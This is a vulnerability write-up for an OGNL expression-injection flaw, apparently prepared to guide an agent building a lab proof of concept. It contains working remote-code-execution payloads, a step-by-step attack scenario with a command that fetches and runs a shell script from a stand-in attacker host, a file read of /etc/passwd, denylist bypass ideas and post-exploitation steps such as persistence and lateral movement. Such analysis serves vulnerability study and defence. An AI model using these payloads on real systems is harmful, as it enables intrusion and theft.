# Vulnerability Analysis: CVE-2025-53192

## CVE ID
CVE-2025-53192

## Vulnerability Classification
- **Type**: Expression/Command Injection (CWE-146)
- **CVSS**: 8.8 (HIGH) — CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
- **Impact**: Remote Code Execution (RCE)

---

## Root Cause

Apache Commons OGNL (Object-Graph Navigation Library) contains a **fundamental design-level expression injection vulnerability** in its expression evaluation engine. The library provides an unrestricted expression evaluation capability that allows:

1. **Unrestricted Class Loading**: The `DefaultClassResolver.classForName()` method (line 51-74 of `DefaultClassResolver.java`) uses `ClassLoader.loadClass(className)` to resolve ANY class name from the classpath with zero restrictions — no allowlist, no denylist, no package filtering.

2. **Unrestricted Method Invocation**: Once a class is resolved, the OGNL engine can invoke any public method on it via `OgnlRuntime.callStaticMethod()` → `ObjectMethodAccessor.callStaticMethod()` → `OgnlRuntime.callAppropriateMethod()` → `OgnlRuntime.invokeMethod()` → `Method.invoke()`.

3. **Unrestricted Object Construction**: The `ASTCtor` node (line 134) calls `OgnlRuntime.callConstructor()` which can instantiate any class — including `java.lang.ProcessBuilder`.

4. **No Class-Level Access Control**: The `DefaultMemberAccess.isAccessible()` method (line 112-136 of `DefaultMemberAccess.java`) ONLY checks Java visibility modifiers (`Modifier.isPublic()`, `Modifier.isPrivate()`, etc.). It does NOT inspect the declaring class — so `java.lang.Runtime.exec()` passes because it is public.

5. **No SecurityManager Integration by Default**: `OgnlRuntime.securityManager` is initialized from `System.getSecurityManager()` (line 130 of `OgnlRuntime.java`), which returns `null` on modern JVMs. The permission check in `invokeMethod()` (line 459) is only active when a SecurityManager is set — and the Java SecurityManager itself is deprecated since JDK 17.

**The root cause is architectural**: OGNL was designed as a powerful object-graph navigation language with full reflection capabilities, but no security sandbox. The vulnerability exists because the library's default configuration provides no mechanism to restrict which classes can be loaded or which methods can be invoked.

---

## Vulnerable File(s) and Function(s)

### Primary Entry Points
| File | Function | Line | Role |
|------|----------|------|------|
| `src/main/java/org/apache/commons/ognl/Ognl.java` | `getValue(String, Object)` | 568 | Primary API: parses + evaluates string expression |
| `src/main/java/org/apache/commons/ognl/Ognl.java` | `getValue(Object, Map, Object)` | 402 | Evaluates parsed AST tree |
| `src/main/java/org/apache/commons/ognl/Ognl.java` | `setValue(String, Object, Object)` | 686 | Write-side API (also evaluates expressions) |
| `src/main/java/org/apache/commons/ognl/Ognl.java` | `parseExpression(String)` | 106 | Parses string into executable AST |

### Core Vulnerable Code Path (Static Method Invocation)
| File | Function | Line | Role |
|------|----------|------|------|
| `src/main/java/org/apache/commons/ognl/ASTStaticMethod.java` | `getValueBody()` | 60-72 | AST node for `@Class@method()` — calls `OgnlRuntime.callStaticMethod()` |
| `src/main/java/org/apache/commons/ognl/OgnlRuntime.java` | `callStaticMethod()` | 941-956 | Resolves class + invokes static method |
| `src/main/java/org/apache/commons/ognl/OgnlRuntime.java` | `classForName()` | 647-669 | Delegates to ClassResolver — loads any class |
| `src/main/java/org/apache/commons/ognl/DefaultClassResolver.java` | `classForName()` | 51-74 | **KEY**: `ClassLoader.loadClass(className)` with NO restrictions |
| `src/main/java/org/apache/commons/ognl/ObjectMethodAccessor.java` | `callStaticMethod()` | 37-45 | Gets methods by name via reflection |
| `src/main/java/org/apache/commons/ognl/OgnlRuntime.java` | `callAppropriateMethod()` | 847-939 | Finds matching method, checks accessibility, invokes |
| `src/main/java/org/apache/commons/ognl/OgnlRuntime.java` | `invokeMethod()` | 454-489 | `Method.invoke()` — the actual dangerous call |

### Alternative Attack Surface (Constructor Invocation)
| File | Function | Line | Role |
|------|----------|------|------|
| `src/main/java/org/apache/commons/ognl/ASTCtor.java` | `getValueBody()` | 75-138 | AST node for `new Class()` — calls `OgnlRuntime.callConstructor()` |
| `src/main/java/org/apache/commons/ognl/OgnlRuntime.java` | `callConstructor()` | 979-1030 | Resolves class, finds constructor, invokes |

### Alternative Attack Surface (Instance Method Chaining)
| File | Function | Line | Role |
|------|----------|------|------|
| `src/main/java/org/apache/commons/ognl/ASTMethod.java` | `getValueBody()` | 74-95 | AST node for `.method()` — calls `OgnlRuntime.callMethod()` |
| `src/main/java/org/apache/commons/ognl/OgnlRuntime.java` | `callMethod()` | 968-977 | Invokes instance method on any object |

### Alternative Attack Surface (Static Field Access)
| File | Function | Line | Role |
|------|----------|------|------|
| `src/main/java/org/apache/commons/ognl/ASTStaticField.java` | `getValueBody()` | 55-59 | AST node for `@Class@field` — calls `OgnlRuntime.getStaticField()` |
| `src/main/java/org/apache/commons/ognl/OgnlRuntime.java` | `getStaticField()` | 1253-1287 | Reads any static field via reflection |

### Alternative Attack Surface (Dynamic Expression Eval)
| File | Function | Line | Role |
|------|----------|------|------|
| `src/main/java/org/apache/commons/ognl/ASTEval.java` | `getValueBody()` | 40-58 | Nested expression evaluation — can parse + evaluate a string as OGNL at runtime |

---

## Triggering Input

### Vector 1: Static Method Call — `@java.lang.Runtime@getRuntime().exec()`
```
@java.lang.Runtime@getRuntime().exec("id")
```
This is the simplest and most direct RCE payload. The OGNL parser creates an `ASTChain` with:
- `ASTStaticMethod` node for `@java.lang.Runtime@getRuntime()` 
- `ASTMethod` node for `.exec("id")` chained on the result

### Vector 2: Constructor + Method Chain — `new ProcessBuilder().start()`
```
(new java.lang.ProcessBuilder(new java.lang.String[]{"id"})).start()
```
Uses `ASTCtor` to instantiate `ProcessBuilder` then `ASTMethod` to call `.start()`.

### Vector 3: Reflection Chain — `Class.forName()` + `.getMethod()` + `.invoke()`
```
@java.lang.Class@forName("java.lang.Runtime").getMethod("exec",new java.lang.Class[]{@java.lang.String@class}).invoke(@java.lang.Runtime@getRuntime(),new java.lang.Object[]{"id"})
```
Uses `ASTStaticMethod` for `Class.forName()`, then chains `.getMethod()` and `.invoke()` via `ASTMethod` nodes.

### Vector 4: Thread-based — `new Thread(new ProcessBuilder(...).start())`
Any expression that eventually calls a dangerous method works.

### Vector 5: ScriptEngine (if Nashorn/Graal on classpath)
```
@javax.script.ScriptEngineManager@new().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('id')")
```

### Vector 6: File I/O
```
new java.io.FileWriter("/tmp/pwned").write("owned")
```
Or:
```
new java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\A").next()
```

---

## Attack Scenario

### Step-by-step exploitation:

1. **Identify a target application** that uses Apache Commons OGNL to evaluate user-controllable expressions. Common scenarios include:
   - Web applications using OGNL in template engines (Apache Struts 2 historically used OGNL)
   - Applications with expression-based configuration
   - Any Java application that calls `Ognl.getValue()` or `Ognl.setValue()` with externally-supplied input

2. **Craft a malicious OGNL expression**:
   ```
   @java.lang.Runtime@getRuntime().exec("curl http://attacker.com/shell.sh | bash")
   ```

3. **Submit the expression** through the application's input channel (HTTP parameter, form field, API body, etc.)

4. **The OGNL engine processes** the expression:
   - `Ognl.parseExpression()` parses the string into an AST
   - The AST tree's `getValue()` method is invoked
   - `ASTStaticMethod.getValueBody()` calls `OgnlRuntime.callStaticMethod("java.lang.Runtime", "getRuntime")`
   - `OgnlRuntime.classForName()` → `DefaultClassResolver.classForName()` → `ClassLoader.loadClass("java.lang.Runtime")` — succeeds, no restrictions
   - `ObjectMethodAccessor.callStaticMethod()` finds and invokes `Runtime.getRuntime()`
   - The chained `.exec()` is invoked on the returned `Runtime` object

5. **Arbitrary command execution** occurs on the server with the privileges of the Java process.

### Authentication Requirements
- **Pre-auth**: The vulnerability is in the library itself — authentication depends entirely on the consuming application. If the application exposes OGNL evaluation to unauthenticated users (e.g., via HTTP parameters), the attack is pre-auth.
- **No credentials needed for the PoC**: The PoC demonstrates the vulnerability by directly calling the OGNL API, which requires no authentication.

---

## Impact

- **Remote Code Execution (RCE)**: Full arbitrary command execution with the privileges of the Java process
- **Confidentiality**: Complete — can read any file accessible to the process, exfiltrate data
- **Integrity**: Complete — can write files, modify data, install backdoors
- **Availability**: Complete — can crash the process, consume resources, or delete critical files

### Escalation Path

The RCE primitive is already the maximum impact. However, additional escalation vectors include:

1. **Process privilege escalation**: If the Java process runs as root or a privileged user, the attacker inherits those privileges
2. **Lateral movement**: Use the compromised host to attack other services on the network
3. **Persistence**: Write cron jobs, SSH keys, or systemd services
4. **Data exfiltration**: Read database credentials from configuration files, then access databases directly

No additional escalation chain through application functionality is needed — the OGNL expression itself provides direct RCE.

---

## Fix Assessment

### Status: NO FIX — Project is RETIRED

The Apache Commons OGNL project is **dormant/retired**. The Apache advisory explicitly states: *"As this project is retired, we do not plan to release a version that fixes this issue. Users are recommended to find an alternative or restrict access to the instance to trusted users."*

There is **no fix commit** to analyze. The vulnerability exists in ALL versions of the library.

### What a Fix Would Require

A proper fix would need to address the vulnerability at multiple levels:

1. **Class-level allowlist/denylist** in `DefaultClassResolver`: Block resolution of dangerous classes like `java.lang.Runtime`, `java.lang.ProcessBuilder`, `java.lang.Thread`, `java.lang.ClassLoader`, `javax.script.ScriptEngineManager`, etc.

2. **Method-level restrictions** in `DefaultMemberAccess`: Beyond Java visibility modifiers, check the declaring class against a denylist before allowing method invocation.

3. **Constructor restrictions** in `OgnlRuntime.callConstructor()`: Prevent instantiation of dangerous classes.

4. **Static field restrictions** in `OgnlRuntime.getStaticField()`: Prevent reading fields that could leak sensitive information or provide dangerous object references.

5. **Nested evaluation restrictions** in `ASTEval`: Prevent dynamic construction and evaluation of OGNL expressions that could bypass other restrictions.

### The fundamental problem is that OGNL's design provides unrestricted expression evaluation. Any "fix" would essentially need to rebuild the security model from scratch.

---

## Potential Bypass Vectors

Since there is no fix, bypass analysis is not applicable. However, for downstream consumers that attempt their own mitigations:

- **Alternative class loading**: Even if `java.lang.Runtime` is blocked, alternatives like `ProcessBuilder`, `Class.forName()` reflection chains, `ScriptEngine`, `javax.naming.InitialContext` (JNDI), `java.net.URLClassLoader`, etc. provide numerous bypass paths
- **Unicode/encoding tricks**: Class name obfuscation through unicode normalization
- **Nested evaluation**: `ASTEval` allows constructing and evaluating OGNL expressions dynamically, potentially bypassing static expression analysis
- **Method chaining**: Even if specific methods are blocked, reflection-based invocation via `Method.invoke()` can bypass method-name-based restrictions

---

## Related Attack Surface

The same unrestricted class resolution and method invocation pattern exists in every code path that processes OGNL expressions. All of the following call into the same vulnerable `DefaultClassResolver`:

### 1. `ASTStaticMethod.java` — Static method calls (`@Class@method()`)
- Line 71: `OgnlRuntime.callStaticMethod(context, className, methodName, args)`

### 2. `ASTStaticField.java` — Static field access (`@Class@field`)
- Line 58: `OgnlRuntime.getStaticField(context, className, fieldName)`

### 3. `ASTCtor.java` — Constructor invocation (`new Class()`)
- Line 93: `OgnlRuntime.classForName(context, className)` for arrays
- Line 134: `OgnlRuntime.callConstructor(context, className, args)` for objects

### 4. `ASTMethod.java` — Instance method calls (`.method()`)
- Line 86: `OgnlRuntime.callMethod(context, source, methodName, args)` — while this operates on an already-resolved object, chaining from static method results allows arbitrary method invocation

### 5. `ASTEval.java` — Dynamic expression evaluation
- Line 47: `Ognl.parseExpression(expr.toString())` — allows dynamic construction and evaluation of OGNL expressions, creating a meta-injection vector

### 6. `ASTInstanceof.java` — Instance-of checks
- Uses `OgnlRuntime.classForName()` to resolve the target type — could potentially be used to probe for class existence

All 6 paths ultimately flow through `OgnlRuntime.classForName()` → `DefaultClassResolver.classForName()` → `ClassLoader.loadClass()`.

---

## Build System

### Build Tool
- **Apache Maven** (pom.xml at repository root)
- **Java Source/Target Level**: 1.8 (Java 8)
- **Parser Generator**: JavaCC / JJTree (`src/main/javacc/ognl.jj`, `src/main/jjtree/ognl.jjt`)
- **Packaging**: JAR

### Build Commands
```bash
# Full build (skip tests for speed)
mvn package -DskipTests -q

# Output artifact
# target/commons-ognl-4.0-SNAPSHOT.jar
```

### Dependencies

#### Runtime Dependencies
| Artifact | Version | Notes |
|----------|---------|-------|
| `org.javassist:javassist` | 3.29.2-GA | Required for expression compilation; core interpretation works without it |

#### Build Dependencies
| Tool | Version | Notes |
|------|---------|-------|
| JDK | 8+ (8 ideal) | Source/target level is 1.8 |
| Maven | 3.x | Standard Maven build |
| JavaCC | (Maven plugin) | Generates parser from grammar |

#### Test Dependencies (not needed for PoC)
| Artifact | Version |
|----------|---------|
| `junit:junit` | 4.13.2 |
| `org.easymock:easymock` | 5.2.0 |

### Runtime Requirements

#### For Lab Environment
- **JDK 8 or 11** (JDK 17+ requires `--add-opens` flags)
- **No external services** needed — the vulnerability is in a library, not a server
- **No network services** — the PoC is a standalone Java program
- **No configuration files** needed

#### JDK 17+ Runtime Flags (if using JDK 17+)
```
--add-opens java.base/java.lang=ALL-UNNAMED
--add-opens java.base/java.util=ALL-UNNAMED
```

### Docker Image Recommendation
- **Base**: `maven:3.9-eclipse-temurin-11` (for building)
- **Runtime**: `eclipse-temurin:11-jre` or `eclipse-temurin:8-jre`
- JDK 11 is the best balance of compatibility and availability
- JDK 8 matches the source target exactly but has fewer base images available

### PoC Compilation
```bash
# After maven build produces target/commons-ognl-4.0-SNAPSHOT.jar:

# Compile PoC
javac -cp target/commons-ognl-4.0-SNAPSHOT.jar Exploit.java

# Run PoC (include javassist from Maven local repo)
java -cp .:target/commons-ognl-4.0-SNAPSHOT.jar:$(find ~/.m2 -name "javassist-3.29.2-GA.jar" 2>/dev/null | head -1) Exploit
```

### Alternative: Minimal PoC Without External Build
The PoC can also be built and run entirely within Docker using a multi-stage build that:
1. Uses `maven:3.9-eclipse-temurin-11` to build the OGNL JAR
2. Copies the JAR + javassist dependency to a runtime image
3. Compiles and runs a minimal Java exploit class

---

## Summary for PoC Agent

The PoC should:
1. Build `commons-ognl-4.0-SNAPSHOT.jar` from source using Maven
2. Create a minimal Java harness that:
   - Creates an `OgnlContext` with default settings
   - Evaluates a malicious OGNL expression using `Ognl.getValue()`
   - Demonstrates RCE via `Runtime.exec()` and captures the output
3. Verify multiple attack vectors:
   - `@java.lang.Runtime@getRuntime().exec()` (static method invocation)
   - `new java.lang.ProcessBuilder(...)` (constructor invocation)
   - Reflection chain via `Class.forName()` (to show depth of the issue)
4. The exploit requires NO authentication — it is a direct API call
5. The PoC is self-contained: no network services, no external dependencies beyond what Maven downloads

### Recommended Primary PoC Expression
```
@java.lang.Runtime@getRuntime().exec(new java.lang.String[]{"sh","-c","id"})
```
This uses the array form of `exec()` to avoid shell escaping issues and captures command output reliably.
